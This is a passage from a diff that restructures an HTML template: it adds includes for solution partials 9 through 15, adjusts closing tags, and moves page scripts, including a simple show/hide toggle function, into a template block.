+              {% include 'partials/solutions/solution_9.html' %}
+              <br>
+              {% include 'partials/solutions/solution_10.html' %}
+              <br>
+              {% include 'partials/solutions/solution_11.html' %}
+              <br>
+              {% include 'partials/solutions/solution_12.html' %}
+              <br>
+              {% include 'partials/solutions/solution_13.html' %}
+              <br>
+              {% include 'partials/solutions/solution_14.html' %}
+              <br>
+              {% include 'partials/solutions/solution_15.html' %}
+              <br>
             </div>
+          </div>
         </div>
+      </div>
     </div>
-    </div>
-    <!-- /#page-content-wrapper -->
+  </div>
+<!-- /#page-content-wrapper -->
+{% endblock %}
 
-    <!-- /#wrapper -->
-
-    <!-- Bootstrap core JavaScript -->
-    <script src="/static/jquery/jquery.min.js"></script>
-    <script src="/static/bootstrap/js/bootstrap.bundle.min.js"></script>
-    <script>
-        function reveal(element) {
-            var x = document.getElementById(element);
-            if (x.style.display === "none") {
-                x.style.display = "block";
-            } else {
-                x.style.display = "none";
-            }
-        }
-    </script>
-
-    <!-- Menu Toggle Script -->
-    <script>
-        $("#menu-toggle").click(function(e) {
-            e.preventDefault();
-            $("#wrapper").toggleClass("toggled");
-        });
-    </script>
-</body>
-
-</html>
+{% block scripts %}
+  {% include 'partials/base_scripts.html' %}
+  <script>
+    function reveal(element) {
+      var x = document.getElementById(element);
+      if (x.style.display === "none") {
+        x.style.display = "block";
+      } else {
+        x.style.display = "none";
+      }
+    }
+  </script>
+{% endblock %}
